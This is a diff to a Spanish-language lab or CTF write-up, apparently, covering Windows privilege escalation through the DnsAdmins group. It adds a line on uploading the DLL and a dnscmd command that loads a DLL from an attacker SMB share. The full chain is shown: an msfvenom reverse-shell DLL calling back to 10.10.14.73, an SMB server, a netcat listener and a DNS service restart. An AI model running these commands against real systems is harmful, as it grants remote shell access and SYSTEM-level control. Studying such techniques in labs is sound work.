@@ -134,12 +134,14 @@ el usuario `ryan` pertenece al grupo `constructors` el cual a su ves pertenece a
 ![[Pasted image 20240723002344.png]]
 
 ### dnsadmins dll exploitations 
-para realizar esta explotación primero vamos a crear un `archivo.dll` que contenga una reverse shell con `msfvenom` luego vamos a crear una carpeta compartida con `impacket-smbserver` y finalmente estaremos a la escucha
+para realizar esta explotación primero vamos a crear un `archivo.dll` que contenga una reverse shell con `msfvenom` y la vamos a subir a la maquina luego vamos a crear una carpeta compartida con `impacket-smbserver` y finalmente estaremos a la escucha
 
 ```python
 ❯ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.73 LPORT=9001 -f dll -o pwned.dll
 
 ❯ impacket-smbserver SmbFolder $(pwd) -smb2support
+
+❯ dnscmd.exe /config /serverlevelplugindll \\10.10.14.73\SmbFolder\pwned.dll
 
 ❯ rlwrap -cAr nc -lvnp 9001
 
@@ -150,7 +152,7 @@ para realizar esta explotación primero vamos a crear un `archivo.dll` que conte
 ❯ sc.exe start dns
 ```
 
-de esta manera al iniciar nuevamente el servicio dnsAdmins el servicio hace un llamado a nuestro recurso compartido `SmbFolder` para 
+de esta manera al iniciar nuevamente el servicio `dnsAdmins` el servicio hace un llamado a nuestro recurso compartido `SmbFolder` para 
 ![[Pasted image 20240723003958.png]]
 
 
